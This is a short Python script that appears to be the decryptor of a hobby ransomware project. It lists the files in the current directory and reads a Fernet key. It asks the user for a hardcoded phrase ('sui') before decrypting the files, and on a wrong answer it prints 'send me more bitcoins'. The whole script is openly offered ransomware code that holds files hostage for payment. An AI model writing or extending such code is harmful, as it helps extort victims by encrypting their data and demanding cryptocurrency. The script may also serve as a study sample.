#!/usr/bin/env  python3

import os
from cryptography.fernet import Fernet
# lets find some files

files=[]

for file in os.listdir():
 if file == "syzygy.py" or file == "thekey.key" or file == "decrypt.py":
  continue
 if os.path.isfile(file):
   files.append(file)
print(files)



with open("thekey.key","rb") as key:
 secretkey=key.read()
secretphrase="sui"
user_phrase=input("enter the secret phrase to decrypt your files\n")
if user_phrase==secretphrase:
 for file in files:
     with open(file,"rb") as  thefile:
       contents = thefile.read()
     contents_decrypted = Fernet(secretkey).decrypt(contents)
     with open(file, "wb") as thefile:
       thefile.write(contents_decrypted)
 print("your files are back")
else:
     print("send me more  bitcoins")
